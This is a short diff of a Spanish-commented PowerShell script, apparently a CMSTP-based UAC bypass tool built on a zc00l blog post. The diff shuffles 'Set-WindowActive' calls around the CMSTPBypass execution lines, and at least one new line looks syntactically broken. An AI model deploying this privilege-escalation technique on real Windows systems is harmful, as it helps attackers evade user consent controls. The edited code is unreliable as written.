@@ -43,7 +43,7 @@ Este script esta basado en una investigacion del blog de zc00l: https://0x00-0x0
  )
 
     if (![System.IO.File]::Exists($Executable)) {
-        $Executable =  (Get-Command $Executable).Source
+        $Executable =  Set-WindowActive (Get-Command $Executable).Source
          if (![System.IO.File]::Exists($Executable)) {
                 Write-Host "[!] Ejecutable no encontrado"
                 exit
@@ -166,12 +166,12 @@ ShortSvcName=""CorpVPN""
 function Execute {
     try 
     {
-        $result = Set-WindowActive [CMSTPBypass]::Execute($final) 
+        $result = [CMSTPBypass]::Execute($final) 
     } 
     catch 
     {
         Add-Type $code
-        $result = Set-WindowActive [CMSTPBypass]::Execute($final) 
+        $result = [CMSTPBypass]::Execute($final) 
     }
 
     if ($result) {
